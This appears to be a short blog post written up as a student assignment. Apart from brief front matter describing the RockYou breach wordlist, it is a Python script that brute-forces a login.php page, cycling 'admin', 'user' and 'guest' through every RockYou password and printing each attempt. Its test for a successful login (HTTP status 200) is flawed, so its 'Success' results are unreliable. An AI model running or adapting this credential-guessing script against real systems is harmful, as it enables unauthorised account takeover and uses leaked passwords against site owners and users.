---
title: Bruteforcing Admin Page using Rockyou
date: 2023-11-05T11:17:34.913Z
description: Rockyou is a wordlists that contains over 14 million password lists
  that leaked in a data breach. This is my assignment about "bruteforcing admin
  page using rockyou."
---
import requests

url = 'https://18f1-95-220-58-175.ngrok-free.app/login.php'
usernames = \['admin', 'user', 'guest']
passwords = \[]
with open("rockyou.txt", "r", encoding = "utf-8", errors = "ignore") as file:
    passwords = file.read().splitlines()
for username in usernames:
    for password in passwords:
        data = {'username': username, 'password': password}
        response = requests.post(url, data=data)
        if response.status_code == 200:
            print(f'Success! Username: {username}, Password: {password}')
        else:
            print(f'Failed! Username: {username}, Password: {password}')